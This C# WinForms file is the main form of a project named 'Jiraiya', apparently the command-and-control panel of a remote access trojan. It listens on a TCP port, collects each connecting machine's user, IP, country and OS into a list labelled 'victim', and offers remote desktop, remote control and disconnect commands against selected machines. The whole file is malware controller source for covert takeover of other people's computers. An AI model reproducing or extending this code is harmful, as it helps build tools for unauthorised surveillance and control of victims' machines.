using Jiraiya.commands;
using Jiraiya.tcp;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace Jiraiya.Forms
{
    public partial class frmMain : Form
    {
        public Server server;
        public frmMain()
        {
            InitializeComponent();
            server = new Server();
            server.SocketAccepted += new Server.SocketAcceptedEventHandler(client_accepted);
            //if not connectd go to connection tab
            if (!server.socket.IsBound)
            {
                this.MainTabControll.SelectedIndex = 1;
            }
        }

        //event handelers



        void client_accepted(Socket s)
        {

            Client c = new Client(s);
            c.Authenticated += new Client.clientAuthenticated(cl_Authed);
            c.Disconnected += new Client.DisconnectiontHandler(disconnecting);
            c.Send(new GetInfo());
            MessageBox.Show("Client connected !!");
        }

        
        private void update_lv_add(Client c)
        {
            try
            {
                // this " " leaves some space between the flag-icon and first item
                 ListViewItem lvi = new ListViewItem(new string[]
                {
                     " " +c.data.UserAtPc ,
                     c.data.IP,
                     "victim",
                     c.data.Country,
                     c.data.OperatingSystem
                 }) 
                 { Tag = c, ImageIndex = c.data.image_index };

                 lstClients.Invoke((MethodInvoker) delegate
                 {
                  lstClients.Items.Add(lvi);
                 });

            }
            catch (InvalidOperationException)
            {
            }
        }

    


        private void cl_Authed(Client s)
        {
            update_lv_add(s);
        }
        private void disconnecting(Client s)
        {
            s.handle_disconnect();
            lstClients.Invoke((MethodInvoker) delegate{
            for (int i = 0; i < lstClients.SelectedItems.Count; i++)
            {
                if (s == (Client)lstClients.SelectedItems[i].Tag)
                {
                    lstClients.Items.Remove(lstClients.Items[i]);
                    break;
                }
            }
             });
        }





        


        //handeling btn clicks and stuff
      
        private void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client cl;
            for (int i = 0; i < this.lstClients.SelectedItems.Count; i++)
            {
                cl = (Client)lstClients.SelectedItems[i].Tag;
                if (cl.frmScreen == null)
                {
                    frmScreen fr = new frmScreen(cl);
                    cl.frmScreen = fr;
                    cl.frmScreen.Show();
                }
                else cl.frmScreen.Focus();
            }
        }

        private void disconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client cl;
            for (int i = 0; i < this.lstClients.SelectedItems.Count; i++)
            {
                cl = (Client)lstClients.SelectedItems[i].Tag;
                cl.Send(new DoClose());
            }
        }

        private void controllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client cl;
            for (int i = 0; i < this.lstClients.SelectedItems.Count; i++)
            {
                cl = (Client)lstClients.SelectedItems[i].Tag;
                if (cl.frmControl == null )
                {
                    frmControl fr = new frmControl(cl);
                    cl.frmControl = fr;
                    fr.Show();
                }
                else cl.frmControl.Focus();
            }
        }


        private void connectionbtn_Click(object sender, EventArgs e)
        {
            if (this.connectionbtn.Text == "Connect")
            {
                if (GetPortSafe() != 0)
                {
                    server.start(GetPortSafe());
                 //   this.MainTabControll.TabPages[1].Text = server.socket.IsBound ? "Connected - " + GetPortSafe().ToString() : "Connection";
                    this.connectionbtn.Text = "Disconnect";
                    this.MainTabControll.SelectedIndex = 0;
                }
                else
                {
                    MessageBox.Show("Port not valid !!");
                } 
            }
            else //connected
            {
                Application.Restart();
            }
        }

      





        private ushort GetPortSafe()
        {
            var portValue = this.Portinp.Text;
            ushort port;
            return (!ushort.TryParse(portValue, out port)) ? (ushort)0 : port;
        }    
    }
}
